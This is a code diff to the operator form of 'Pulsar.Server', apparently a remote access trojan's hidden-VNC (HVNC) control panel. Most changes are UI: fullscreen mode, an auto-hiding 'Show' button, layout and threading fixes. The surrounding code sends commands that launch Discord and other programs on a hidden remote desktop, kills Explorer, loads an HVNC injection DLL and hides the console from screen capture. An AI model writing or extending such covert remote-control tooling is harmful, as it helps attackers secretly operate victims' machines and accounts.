@@ -8,15 +8,15 @@ using Pulsar.Server.Helper;
 using Pulsar.Server.Messages;
 using Pulsar.Server.Networking;
 using Pulsar.Server.Utilities;
+using Pulsar.Common.Messages.Monitoring.HVNC;
 using System;
 using System.Collections.Generic;
-using System.Drawing;
-using System.Threading;
-using System.Windows.Forms;
 using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Runtime.InteropServices;
-using Pulsar.Common.Messages.Monitoring.HVNC;
+using System.Threading;
+using System.Windows.Forms;
 
 namespace Pulsar.Server.Forms
 {
@@ -71,6 +71,23 @@ namespace Pulsar.Server.Forms
         private bool _useGPU = false;
         private const int UpdateInterval = 10;
 
+        // Frame / size metrics
+        private readonly Stopwatch _stopwatch = new Stopwatch();
+        private int _sizeFrames = 0;
+        private int _remoteDesktopWidth = 0;
+        private int _remoteDesktopHeight = 0;
+
+        // Auto-hide logic for the "Show" button
+        private System.Windows.Forms.Timer _showButtonHideTimer;
+        private bool _showButtonVisible = true;
+        private bool _mouseHoveringTopArea = false;
+
+        // Fullscreen state
+        private bool _isFullscreen = false;
+        private Rectangle _previousBounds;
+        private FormBorderStyle _previousBorderStyle;
+        private FormWindowState _previousWindowState;
+
         /// <summary>
         /// Creates a new HVNC form for the client or gets the current open form, if there exists one already.
         /// </summary>
@@ -101,11 +118,48 @@ namespace Pulsar.Server.Forms
             _clipboardMonitor = new ClipboardMonitor(client);
 
             RegisterMessageHandler();
-            InitializeComponent();
+
+            try
+            {
+                InitializeComponent();
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"FrmHVNC.InitializeComponent failed: {ex}");
+                MessageBox.Show(
+                    $"Failed to initialize HVNC form.\n\n{ex}",
+                    "HVNC Error",
+                    MessageBoxButtons.OK,
+                    MessageBoxIcon.Error);
+                throw;
+            }
 
             DarkModeManager.ApplyDarkMode(this);
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+
+            // Initial input button visuals
             UpdateInputButtonsVisualState();
+
+            // Layout and resize hookup
+            this.Resize += FrmHVNC_Resize;
+
+            // Auto-hide timer for the "Show" button
+            _showButtonHideTimer = new System.Windows.Forms.Timer();
+            _showButtonHideTimer.Interval = 2500; // 2.5 seconds
+            _showButtonHideTimer.Tick += (s, e) =>
+            {
+                if (!_mouseHoveringTopArea)
+                    HideShowButton();
+            };
+
+            // Track mouse movement to reveal Show button when hovering near top
+            this.MouseMove += Frm_MouseMove;
+            picDesktop.MouseMove += Frm_MouseMove;
+            panelTop.MouseMove += Frm_MouseMove;
+
+            // Ensure initial layout properly
+            UpdateDesktopLayout();
+            PositionShowButtonTopCenter();
         }
 
         private void UpdateInputButtonsVisualState()
@@ -136,10 +190,21 @@ namespace Pulsar.Server.Forms
         /// <param name="connected">True if the client connected, false if disconnected</param>
         private void ClientDisconnected(Client client, bool connected)
         {
-            if (!connected)
+            if (connected)
+                return;
+
+            if (IsDisposed || !IsHandleCreated)
+                return;
+
+            try
             {
-                this.Invoke((MethodInvoker)this.Close);
+                BeginInvoke((MethodInvoker)(() =>
+                {
+                    if (!IsDisposed)
+                        Close();
+                }));
             }
+            catch (ObjectDisposedException) { }
         }
 
         /// <summary>
@@ -208,7 +273,6 @@ namespace Pulsar.Server.Forms
             _hVNCHandler.EnableKeyboardInput = _enableKeyboardInput;
 
             _hVNCHandler.MaxFramesPerSecond = 30;
-
             _hVNCHandler.BeginReceiveFrames(barQuality.Value, cbMonitors.SelectedIndex, useGPU);
         }
 
@@ -220,7 +284,6 @@ namespace Pulsar.Server.Forms
             ToggleConfigurationControls(false);
 
             picDesktop.Stop();
-            // Unsubscribe from the frame counter. It will be re-created when starting again.
             picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);
 
             this.ActiveControl = picDesktop;
@@ -248,26 +311,36 @@ namespace Pulsar.Server.Forms
         {
             panelTop.Visible = visible;
             btnShow.Visible = !visible;
+            _showButtonVisible = !visible;
+
+            // Layout refresh
+            UpdateDesktopLayout();
+            PositionShowButtonTopCenter();
 
             if (visible)
             {
-                // Restore picture below panel
-                picDesktop.Top = panelTop.Bottom;
-                picDesktop.Height = this.ClientSize.Height - panelTop.Height;
+                // Panel visible -> we don't need the Show button
+                _showButtonHideTimer.Stop();
+                btnShow.Visible = false;
+                _showButtonVisible = false;
             }
             else
             {
-                // Expand picture to fill the whole window
-                picDesktop.Top = 0;
-                picDesktop.Height = this.ClientSize.Height;
+                // Panel hidden -> show button briefly, then auto-hide
+                btnShow.Visible = true;
+                _showButtonVisible = true;
+                _showButtonHideTimer.Stop();
+                _showButtonHideTimer.Start();
             }
 
-            // Keep full width either way
-            picDesktop.Width = this.ClientSize.Width;
-
-            this.ActiveControl = picDesktop;
+            picDesktop.Invalidate();
         }
 
+        private void PositionShowButtonTopCenter()
+        {
+            btnShow.Left = (ClientSize.Width - btnShow.Width) / 2;
+            btnShow.Top = 10; // distance from top border
+        }
 
         /// <summary>
         /// Called whenever the remote displays changed.
@@ -287,11 +360,6 @@ namespace Pulsar.Server.Forms
         /// </summary>
         /// <param name="sender">The message handler which raised the event.</param>
         /// <param name="bmp">The new desktop image to draw.</param>
-        private Stopwatch _stopwatch = new Stopwatch();
-        private int _sizeFrames = 0;
-        private int _remoteDesktopWidth = 0;
-        private int _remoteDesktopHeight = 0;
-
         private void UpdateImage(object sender, Bitmap bmp)
         {
             if (!_stopwatch.IsRunning)
@@ -318,17 +386,23 @@ namespace Pulsar.Server.Forms
                 double avg = _hVNCHandler.AverageFrameSizeBytes;
                 if (last > 0 || avg > 0)
                 {
-                    double lastKB = last / 1024.0;
                     double avgKB = avg / 1024.0;
-                    this.Invoke((MethodInvoker)delegate
+                    if (sizeLabelCounter.InvokeRequired)
+                    {
+                        sizeLabelCounter.BeginInvoke((MethodInvoker)(() =>
+                        {
+                            sizeLabelCounter.Text = $"{avgKB:0.0}  KB";
+                        }));
+                    }
+                    else
                     {
                         sizeLabelCounter.Text = $"{avgKB:0.0}  KB";
-                    });
+                    }
                 }
             }
 
             picDesktop.UpdateImage(bmp, false);
-            
+
             // Update remote desktop dimensions for proper mouse coordinate scaling
             _remoteDesktopWidth = picDesktop.ScreenWidth;
             _remoteDesktopHeight = picDesktop.ScreenHeight;
@@ -347,6 +421,10 @@ namespace Pulsar.Server.Forms
             _hVNCHandler.RefreshDisplays();
 
             cbMonitors.SelectedIndex = 0;
+
+            // Ensure layout / show button positions are correct initially
+            UpdateDesktopLayout();
+            PositionShowButtonTopCenter();
         }
 
         /// <summary>
@@ -382,9 +460,15 @@ namespace Pulsar.Server.Forms
             _hVNCHandler.Dispose();
             _clipboardMonitor?.Dispose();
 
-
             picDesktop.GetImageSafe?.Dispose();
             picDesktop.GetImageSafe = null;
+
+            if (_showButtonHideTimer != null)
+            {
+                _showButtonHideTimer.Stop();
+                _showButtonHideTimer.Dispose();
+                _showButtonHideTimer = null;
+            }
         }
 
         private void FrmHVNC_Resize(object sender, EventArgs e)
@@ -392,25 +476,28 @@ namespace Pulsar.Server.Forms
             if (WindowState == FormWindowState.Minimized)
                 return;
 
-            panelTop.Width = this.ClientSize.Width;
-            picDesktop.Width = this.ClientSize.Width;
-
-            if (panelTop.Visible)
-            {
-                picDesktop.Top = panelTop.Bottom;
-                picDesktop.Height = this.ClientSize.Height - panelTop.Height;
-            }
-            else
-            {
-                picDesktop.Top = 0;
-                picDesktop.Height = this.ClientSize.Height;
-            }
-
-            btnShow.Left = (this.ClientSize.Width - btnShow.Width) / 2;
-            btnShow.Top = this.ClientSize.Height - btnShow.Height - 40;
+            UpdateDesktopLayout();
+            PositionShowButtonTopCenter();
         }
 
+        /// <summary>
+        /// Centralized layout update that ensures picDesktop fills only the visible client area
+        /// and the top panel is respected.
+        /// </summary>
+        private void UpdateDesktopLayout()
+        {
+            picDesktop.Dock = DockStyle.None;
 
+            int yOffset = 0;
+            if (panelTop.Visible)
+                yOffset += panelTop.Height;
+
+            picDesktop.Location = new Point(0, yOffset);
+            picDesktop.Size = new Size(ClientSize.Width, ClientSize.Height - yOffset);
+
+            picDesktop.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
+            picDesktop.Invalidate();
+        }
 
         private void btnStart_Click(object sender, EventArgs e)
         {
@@ -508,7 +595,6 @@ namespace Pulsar.Server.Forms
 
             SetClientClipboardSync(_enableBidirectionalClipboard);
 
-
             if (_enableBidirectionalClipboard)
             {
                 Thread clipboardThread = new Thread(() =>
@@ -562,6 +648,7 @@ namespace Pulsar.Server.Forms
         #endregion
 
         #region Helper Methods
+
         /// <summary>
         /// Loads the HVNCInjection.x64.dll from the current working directory as bytes.
         /// </summary>
@@ -587,9 +674,11 @@ namespace Pulsar.Server.Forms
                 return null;
             }
         }
+
         #endregion
 
         #region MenuItems
+
         private void menuItem1_Click(object sender, EventArgs e)
         {
             _connectClient.Send(new StartHVNCProcess
@@ -699,6 +788,14 @@ namespace Pulsar.Server.Forms
             }
         }
 
+        private void startDiscordToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            _connectClient.Send(new StartHVNCProcess
+            {
+                Path = "Discord"
+            });
+        }
+
         #endregion
 
         #region Input Event Handlers
@@ -711,7 +808,7 @@ namespace Pulsar.Server.Forms
         {
             if (_remoteDesktopWidth == 0 || picDesktop.Width == 0)
                 return x;
-            
+
             return (int)Math.Round((double)x * _remoteDesktopWidth / picDesktop.Width);
         }
 
@@ -723,7 +820,7 @@ namespace Pulsar.Server.Forms
         {
             if (_remoteDesktopHeight == 0 || picDesktop.Height == 0)
                 return y;
-            
+
             return (int)Math.Round((double)y * _remoteDesktopHeight / picDesktop.Height);
         }
 
@@ -815,19 +912,15 @@ namespace Pulsar.Server.Forms
         private void btnHide_Click(object sender, EventArgs e)
         {
             TogglePanelVisibility(false);
+
+            // kick off hide timer after user hides panel
+            _showButtonHideTimer.Stop();
+            _showButtonHideTimer.Start();
         }
 
         private void btnShow_Click(object sender, EventArgs e)
         {
             TogglePanelVisibility(true);
-        }
-
-        private void startDiscordToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            _connectClient.Send(new StartHVNCProcess
-            {
-                Path = "Discord"
-            });
         }
 
         #region Win32 API and Helper Methods
@@ -848,7 +941,7 @@ namespace Pulsar.Server.Forms
 
             int lParam = 0;
 
-            lParam |= 1;
+            lParam |= 1; // repeat count
 
             lParam |= (int)(scanCode << 16);
 
@@ -902,5 +995,144 @@ namespace Pulsar.Server.Forms
         }
 
         #endregion
+
+        // ======== FULLSCREEN TOGGLE ========
+
+        private void ToggleFullscreen()
+        {
+            if (!_isFullscreen)
+            {
+                // save normal mode layout
+                _previousBounds = this.Bounds;
+                _previousBorderStyle = this.FormBorderStyle;
+                _previousWindowState = this.WindowState;
+
+                // go borderless fullscreen on current monitor
+                FormBorderStyle = FormBorderStyle.None;
+                WindowState = FormWindowState.Normal;
+                Bounds = Screen.FromControl(this).Bounds;
+
+                // hide top panel
+                panelTop.Visible = false;
+
+                // picDesktop fills entire area
+                UpdateDesktopLayout();
+
+                // show the show-button (auto-hide timer will handle hiding)
+                btnShow.Visible = true;
+                _showButtonVisible = true;
+                PositionShowButtonTopCenter();
+                _showButtonHideTimer.Stop();
+                _showButtonHideTimer.Start();
+
+                _isFullscreen = true;
+            }
+            else
+            {
+                // restore previous window settings
+                FormBorderStyle = _previousBorderStyle;
+                WindowState = _previousWindowState;
+                Bounds = _previousBounds;
+
+                // restore panel visibility
+                panelTop.Visible = true;
+
+                // restore layout
+                UpdateDesktopLayout();
+
+                // hide show button again
+                btnShow.Visible = false;
+                _showButtonVisible = false;
+                _showButtonHideTimer.Stop();
+
+                _isFullscreen = false;
+            }
+        }
+
+        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
+        {
+            // ESC exits fullscreen
+            if (keyData == Keys.Escape && _isFullscreen)
+            {
+                ToggleFullscreen();
+                return true; // handled
+            }
+
+            // F11 toggles fullscreen
+            if (keyData == Keys.F11)
+            {
+                ToggleFullscreen();
+                return true; // handled
+            }
+
+            return base.ProcessCmdKey(ref msg, keyData);
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            ToggleFullscreen();
+        }
+
+        // ======== SHOW BUTTON AUTO-HIDE / HOVER LOGIC ========
+
+        private void Frm_MouseMove(object sender, MouseEventArgs e)
+        {
+            // Convert to form client coordinates
+            Point clientPos = e.Location;
+            if (sender is Control c && c != this)
+            {
+                clientPos = this.PointToClient(c.PointToScreen(e.Location));
+            }
+
+            int hoverZoneHeight = 40; // top 40px area
+            bool isHoveringTop = clientPos.Y <= hoverZoneHeight;
+
+            if (isHoveringTop && !panelTop.Visible)
+            {
+                _mouseHoveringTopArea = true;
+                ShowShowButton();
+            }
+            else
+            {
+                _mouseHoveringTopArea = false;
+
+                if (_showButtonVisible)
+                {
+                    _showButtonHideTimer.Stop();
+                    _showButtonHideTimer.Start();
+                }
+            }
+        }
+
+        private void HideShowButton()
+        {
+            if (!_showButtonVisible)
+                return;
+
+            _showButtonVisible = false;
+            btnShow.Visible = false;
+        }
+
+        private void ShowShowButton()
+        {
+            if (_showButtonVisible)
+                return;
+
+            _showButtonVisible = true;
+            btnShow.Visible = true;
+
+            // Restart timer so it hides again after a delay
+            _showButtonHideTimer.Stop();
+            _showButtonHideTimer.Start();
+        }
+
+        private void closeExplorerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            _connectClient.Send(new StartHVNCProcess
+            {
+                Path = "KillExplorer"
+            });
+        }
+
     }
 }
